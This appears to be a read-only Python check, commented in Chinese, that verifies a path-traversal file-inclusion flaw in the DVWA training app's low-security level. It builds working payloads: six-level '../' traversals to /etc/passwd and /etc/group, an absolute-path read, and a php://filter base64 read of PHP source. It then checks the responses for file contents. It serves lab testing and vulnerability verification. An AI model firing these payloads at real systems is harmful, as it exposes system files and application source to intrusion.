#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
bf_b1_dvwa_lfi.py — B1-LFI-01 只读检测：DVWA 文件包含路径穿越
==============================================================
漏洞类型：PHP 远程/本地文件包含（LFI / Path Traversal），CWE-22 / CWE-98
靶场标识：DVWA low 档 `/vulnerabilities/fi/?page=`
参考笔记：security/learning/loop3-b-dvwa-bwapp-report-t4-20261012.md §1（B1-LFI-01）
          security/learning/_evidence/verified-loop3-b-b1-depth-20261012-2236.json
原理    ：DVWA low 的 fi 关卡把 `$_GET['page']` 直接交给 `include()`。PHP 的相对
          include 按**被包含脚本所在目录**解析（这里是
          `/var/www/html/dvwa/vulnerabilities/fi/`），因此上跳到根目录需要
          **6 级 `../`**。loop3 实测：1–5 级全部无效（HTTP 200 但长度恒为 3680、
          无文件内容），6 级才首次命中 `/etc/passwd`（响应 6936 字节）。
          → **默认 depth = 6，这是 loop3 实测的唯一成功姿势，别改回 4。**
          另：绝对路径 `/etc/passwd` 与 6 级等价。
非破坏性：本脚本**只发 GET**。不 PUT、不 DELETE、不上传文件、不执行命令、不写目标。
          读取的探针文件只有三个：/etc/passwd（基线对照）、/etc/hostname（对照）、
          以及自身源码页 include.php 的 php://filter base64。只读，不改目标状态。
判据      ：**比对响应体内容，不看状态码**。DVWA low 的 `display_errors` 表现是
          「文件不存在也返回 200 且无 Warning」（loop3 §2.5 实测），所以状态码毫无
          区分度，必须靠「响应体是否出现文件独有内容」。
评级纪律  ：结论只写 `vulnerable / not_vulnerable / needs_manual_confirmation`，
          **复现率按区间 + 分子分母**，不写 100%。

用法
    python bf_b1_dvwa_lfi.py -u http://127.0.0.1
    python bf_b1_dvwa_lfi.py -u http://192.168.56.101 --json
"""

from __future__ import annotations

import argparse
import re
import sys
from urllib.parse import quote

sys.path.insert(0, r"D:\vuln-xiuxian\poc")
import bfnet  # noqa: E402

VULN_ID = "B1-LFI-01"
NAME = "DVWA low 文件包含路径穿越（?page=）"
CWE = ["CWE-22", "CWE-98"]

# loop3 实测的临界深度（verified-loop3-b-b1-depth-20261012-2236.json）
CRITICAL_DEPTH = 6

# 探针文件：(标签, 文件绝对路径, 该文件独有的内容标记)
# 标记必须是「只在文件里、绝不出现在页面框架里」的字符串，否则无法区分包含成功与回显巧合。
PROBES = [
    ("etc-passwd", "/etc/passwd", "root:x:0:0"),
    ("etc-hostname", "/etc/hostname", None),  # 动态内容，只用「长度突变 + 与基线不同」判
    ("etc-group", "/etc/group", "root:x:0:"),
]

# 基线：DVWA 正常页面的特征（页面框架渲染成功 = 端点活着）
BASELINE_PATH = "index.php"
# 「文件不存在」的负对照：DVWA low 同样返回 200 + 页面框架，但无文件内容
NEGATIVE_TRAVERSAL = "../../../../../../bf-nonexistent-probe-file"


def build_traversal(depth: int, target_abs: str) -> str:
    """构造 `../`*depth + 绝对路径（去掉前导 /）。"""
    return "../" * depth + target_abs.lstrip("/")


def build_abs(target_abs: str) -> str:
    """构造绝对路径形式（与 6 级等价，loop3 实测 1/1 成功）。"""
    return target_abs


def classify(resp: bfnet.Response, markers) -> tuple[bool, str]:
    """判断响应体里是否出现文件独有内容。

    返回 (命中, 命中说明)。**不看 HTTP 状态码**（loop3 §2.5：失败也是 200）。
    """
    if not resp.ok:
        return False, f"请求失败：{resp.error}"
    text = resp.text
    hit_terms = []
    for m in markers:
        if m and m in text:
            hit_terms.append(m)
    return bool(hit_terms), ("；".join(hit_terms) if hit_terms else "")


def parse_cookie_header(raw: str) -> dict:
    """把 `--cookie "PHPSESSID=xxx; security=low"` 解析成 dict。

    注意：cookie 由使用者**从自己已登录的浏览器里复制**，本脚本不执行登录、
    不产生任何写操作。只读地把它附加到后续 GET 上。
    """
    out = {}
    for part in raw.split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        k, v = part.split("=", 1)
        out[k.strip()] = v.strip()
    return out


def run(args) -> dict:
    evidence: list[str] = []
    notes: list[str] = []
    limiter = bfnet.RateLimiter(args.interval)

    cookies = parse_cookie_header(args.cookie) if args.cookie else {}
    extra_headers = {"Cookie": args.cookie.strip()} if args.cookie else None
    if cookies:
        notes.append(f"已附加使用者提供的 cookie（{len(cookies)} 项：{', '.join(sorted(cookies))}）；"
                     f"本脚本不执行登录，未提供 cookie 时只能给出 UNKNOWN")

    fi_url = args.baseurl.rstrip("/") + "/" + args.fi_path.strip("/")
    if not fi_url.endswith("/"):
        fi_url += "/"

    # 白名单校验必须在任何发包之前
    bfnet.assert_allowed(fi_url)

    # ---- 1. 基线：正常 ?page=include.php ----
    base_url = fi_url + "?page=" + quote(args.baseline_page)
    r_base = bfnet.probe(base_url, "GET", headers=extra_headers, limiter=limiter, timeout=args.timeout)
    notes.append(f"基线请求 {r_base.summary(120)}")
    if not r_base.ok:
        return finish(args, fi_url, False, evidence + [f"基线请求失败：{r_base.error}"],
                      None, limiter, notes, "端点不可达，无法判定")
    base_len = len(r_base.body)
    evidence.append(f"基线 GET ?page={args.baseline_page} -> HTTP {r_base.status}，"
                    f"body={base_len}B，sha256={r_base.sha256[:16]}…（页面框架基线）")

    # ---- 0.5 认证门禁：DVWA 未登录时任何关卡都 302 回 login.php ----
    # 绝不能把「未认证 → 302」当成「不可利用」（loop3 血泪：不可测 ≠ 不可用）。
    # 本脚本**不做登录**（登录会产生会话写入，属写操作）→ 明确报 needs_manual_confirmation。
    if r_base.status in (301, 302, 303, 307, 308):
        loc = r_base.header("Location") or "(无 Location 头)"
        return finish(args, fi_url, False, evidence + [
            f"【认证门禁】关卡返回 HTTP {r_base.status} -> Location: {loc}",
        ], r_base.sha256, limiter, notes + [
            "本脚本为纯只读检测，**不做登录**（登录会写入 PHP 会话文件，属写操作）。"
            "因此未认证访问 DVWA 会被 302 到 login.php，漏洞无法被本脚本直接验证。",
            "结论判定为 UNKNOWN 而非 NOT-VULNERABLE：loop3 已实测该端点在登录后 low 档成立"
            "（`security/learning/_evidence/verified-loop3-b-b1-depth-20261012-2236.json`，"
            "6 级穿越 3/3、绝对路径 1/1、php://filter 3/3）。",
            "人工确认步骤：浏览器登录 DVWA（admin/password）并把 security 档位设为 low，"
            "然后在已登录会话里直接访问 "
            "`<站点>/vulnerabilities/fi/?page=../../../../../../etc/passwd`，"
            "看到响应中出现 `root:x:0:0` 即确认。",
        ], f"UNKNOWN：端点需登录（HTTP {r_base.status} -> {loc}），只读脚本无法验证，"
           f"需人工在已登录 low 档会话中确认")

    if "DVWA" not in r_base.text and args.baseline_page not in r_base.text:
        notes.append("基线页未见 'DVWA' 字样，目标可能不是 DVWA fi 关卡；结论按 UNKNOWN 处理")

    # ---- 2. 负对照：不存在的文件（应与基线长度接近，无文件内容） ----
    neg_url = fi_url + "?page=" + quote(NEGATIVE_TRAVERSAL)
    r_neg = bfnet.probe(neg_url, "GET", headers=extra_headers, limiter=limiter, timeout=args.timeout)
    neg_len = len(r_neg.body) if r_neg.ok else -1
    hit_neg, why_neg = classify(r_neg, [m for _, _, m in PROBES if m])
    evidence.append(f"负对照 GET ?page={NEGATIVE_TRAVERSAL} -> HTTP {r_neg.status}，"
                    f"body={neg_len}B（基线 {base_len}B），文件标记命中={hit_neg}"
                    f"{'（' + why_neg + '）' if why_neg else ''}")
    if hit_neg:
        # 负对照都命中 = 说明目标根本不校验 include 路径，判据失效
        notes.append("【判据失效】连不存在的文件都命中标记，说明该目标不是 DVWA fi 关卡，"
                     "或前置有缓存/代理篡改响应；本次结论作废，不报告 vulnerable")

    # ---- 3. 深度扫描：1..args.depth ----
    depth_hits: dict[str, dict] = {}
    for depth in range(1, args.depth + 1):
        target = build_traversal(depth, "/etc/passwd")
        url = fi_url + "?page=" + quote(target)
        r = bfnet.probe(url, "GET", headers=extra_headers, limiter=limiter, timeout=args.timeout)
        hit, why = classify(r, ["root:x:0:0", "root:x:0:"])
        depth_hits[str(depth)] = {
            "status": r.status,
            "body_len": len(r.body) if r.ok else -1,
            "hit": hit,
        }
        notes.append(f"深度 {depth} 级：HTTP {r.status} body={len(r.body) if r.ok else -1}B "
                     f"命中={hit}{'（' + why + '）' if why else ''}")
        if hit:
            evidence.append(f"★ 路径穿越命中：depth={depth} `?page={'../' * depth}etc/passwd` "
                            f"-> HTTP {r.status}，body={len(r.body)}B，"
                            f"检出 `root:x:0:0`（文件独有内容）")

    # ---- 4. 绝对路径（与 6 级等价，loop3 实测 1/1） ----
    abs_url = fi_url + "?page=" + quote(build_abs("/etc/passwd"))
    r_abs = bfnet.probe(abs_url, "GET", headers=extra_headers, limiter=limiter, timeout=args.timeout)
    hit_abs, why_abs = classify(r_abs, ["root:x:0:0", "root:x:0:"])
    depth_hits["abs"] = {"status": r_abs.status,
                         "body_len": len(r_abs.body) if r_abs.ok else -1,
                         "hit": hit_abs}
    evidence.append(f"绝对路径 `?page=/etc/passwd` -> HTTP {r_abs.status}，"
                    f"body={len(r_abs.body) if r_abs.ok else -1}B，命中={hit_abs}"
                    f"{'（' + why_abs + '）' if why_abs else ''}")

    # ---- 5. php://filter 读自身源码（第二个独立判据） ----
    phpfilter_hit = False
    if not args.skip_phpfilter:
        pf_target = "php://filter/convert.base64-encode/resource=include.php"
        pf_url = fi_url + "?page=" + quote(pf_target, safe="")
        r_pf = bfnet.probe(pf_url, "GET", headers=extra_headers, limiter=limiter, timeout=args.timeout)
        if r_pf.ok:
            import base64 as _b64
            import re as _re
            cands = _re.findall(r"[A-Za-z0-9+/]{60,}={0,2}", r_pf.text)
            for c in cands:
                try:
                    dec = _b64.b64decode(c, validate=False)
                except Exception:  # noqa: BLE001
                    continue
                if dec.lstrip()[:5] == b"<?php" or b"allow_url_include" in dec:
                    phpfilter_hit = True
                    evidence.append(f"★ php://filter 读源码命中："
                                    f"`?page={pf_target}` 解出 {len(dec)} 字节，"
                                    f"以 `<?php` 开头（sha256={bfnet.sha256_bytes(dec)[:16]}…）")
                    break
        if not phpfilter_hit:
            notes.append("php://filter 未解出以 <?php 开头的源码（本轮不作为判据，不作否定结论）")

    # ---- 定性 ----
    depth_hit_list = [d for d, v in depth_hits.items() if d.isdigit() and v["hit"]]
    confirmed_by_content = bool(depth_hit_list) or hit_abs
    if hit_neg:
        # 负对照命中 → 判据无效
        return finish(args, fi_url, False, evidence, r_base.sha256, limiter, notes, "UNKNOWN：判据失效")

    if not confirmed_by_content:
        attempts = args.depth + 1
        return finish(args, fi_url, False, evidence, r_base.sha256, limiter, notes,
                      f"NOT-VULNERABLE/UNKNOWN：{attempts}/{attempts} 个探针（depth 1-{args.depth} + 绝对路径）"
                      f"均未在响应体中检出文件独有内容")

    first_hit = min((int(d) for d in depth_hit_list), default=None)
    detail = (f"depth 1-{args.depth} + 绝对路径共 {args.depth + 1} 个探针，"
              f"命中 {len(depth_hit_list) + (1 if hit_abs else 0)} 个")
    if first_hit is not None:
        detail += f"，最小命中深度 = {first_hit}（loop3 实测临界值 6，若本轮与之不符请核对安装路径）"
    if phpfilter_hit:
        detail += "；php://filter 源码读取亦命中（第二判据一致）"
    return finish(args, fi_url, True, evidence, r_base.sha256, limiter, notes,
                  f"VULNERABLE：{detail}")


def finish(args, target, vulnerable, evidence, sha, limiter, notes, verdict_line) -> dict:
    return {
        "tool": "bf_b1_dvwa_lfi",
        "vuln_id": VULN_ID,
        "name": NAME,
        "cwe": CWE,
        "severity_hint": "High",
        "target": target,
        "vulnerable": vulnerable,
        "confidence": "confirmed_by_content" if vulnerable else "unknown",
        "verdict": verdict_line,
        "evidence": evidence,
        "notes": notes,
        "sha256_of_response": sha,
        "requests_sent": limiter.sent,
        "interval_s": limiter.interval,
        "destructive": False,
        "methods_used": ["GET"],
        "loop3_reference": [
            "security/learning/loop3-b-dvwa-bwapp-report-t4-20261012.md",
            "security/learning/_evidence/verified-loop3-b-b1-depth-20261012-2236.json",
        ],
    }


def main() -> int:
    ap = argparse.ArgumentParser(description="B1-LFI-01 只读检测（DVWA ?page= 路径穿越）")
    ap.add_argument("-u", "--baseurl", default="http://127.0.0.1",
                    help="DVWA 站点基址，如 http://127.0.0.1 或 http://192.168.56.101/dvwa")
    ap.add_argument("--fi-path", default="/vulnerabilities/fi/",
                    help="fi 关卡路径（默认 /vulnerabilities/fi/）")
    ap.add_argument("--baseline-page", default="include.php",
                    help="基线页面参数值（默认 include.php）")
    ap.add_argument("--depth", type=int, default=CRITICAL_DEPTH,
                    help=f"穿越深度上限（loop3 实测临界 {CRITICAL_DEPTH}，默认 {CRITICAL_DEPTH}）")
    ap.add_argument("--cookie", default="",
                    help="可选：使用者自己已登录的 cookie 串（PHPSESSID=xxx; security=low）。"
                         "脚本不执行登录，只读地附加到 GET 上")
    ap.add_argument("--skip-phpfilter", action="store_true",
                    help="跳过 php://filter 源码读取探测（少 1 个请求）")
    bfnet.add_common_args(ap, skip_baseurl=True)
    args = ap.parse_args()

    result = run(args)
    bfnet.emit(result, args.json)
    return 0 if result["vulnerable"] else 1


if __name__ == "__main__":
    sys.exit(main())